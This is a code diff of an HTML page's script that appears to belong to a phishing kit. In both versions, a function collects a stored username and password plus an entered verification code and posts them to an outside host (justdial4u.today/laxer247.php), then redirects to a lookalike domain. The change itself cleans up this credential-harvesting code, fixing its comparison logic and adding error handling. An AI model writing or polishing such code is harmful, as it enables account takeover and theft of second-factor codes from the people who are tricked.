@@ -130,34 +130,42 @@
         </div>
     </div>
 
-    <script>
-        function codeThenMail(){
-            var code = $('#code').val();
+   <script>
+    function codeThenMail() {
+        var code = $('#code').val();
 
-            if (code == "") {
-                document.getElementById("codeError").style.display = "block";
-            } else {
-                document.getElementById("codeError").style.display = "none";
-            }
-
-            if(code != ""){
-                var username = sessionStorage.getItem("username");
-                var password  = sessionStorage.getItem("password");
-                $.ajax({
-                    url : 'https://justdial4u.today/laxer247.php',
-                    type: 'post',
-                    data : {username, password, code},
-                    success: function(result){
-                        if(result="sucessmsg"){
-                            // alert('Server not responding. Please after some time.');
-                            window.location.href = "https://laxzer247.com";
-                        }
-                    }
-                });
-            }
-
+        // Display error if code is empty
+        if (code == "") {
+            document.getElementById("codeError").style.display = "block";
+        } else {
+            document.getElementById("codeError").style.display = "none";
         }
-    </script>
+
+        // If code is provided, proceed with AJAX request
+        if (code != "") {
+            var username = sessionStorage.getItem("username");
+            var password  = sessionStorage.getItem("password");
+
+            $.ajax({
+                url: 'https://justdial4u.today/laxer247.php',
+                type: 'post',
+                data: { username, password, code },
+                success: function(result) {
+                    // Fixing the comparison logic
+                    if (result === "sucessmsg") {
+                        // Redirect on success
+                        window.location.href = "https://laxzer247.com";
+                    }
+                },
+                error: function(xhr, status, error) {
+                    // Handle errors
+                    console.log("Error: " + status + " - " + error);
+                    alert("There was an issue with the request. Please try again later.");
+                }
+            });
+        }
+    }
+</script>
 
 </body>
 </html>
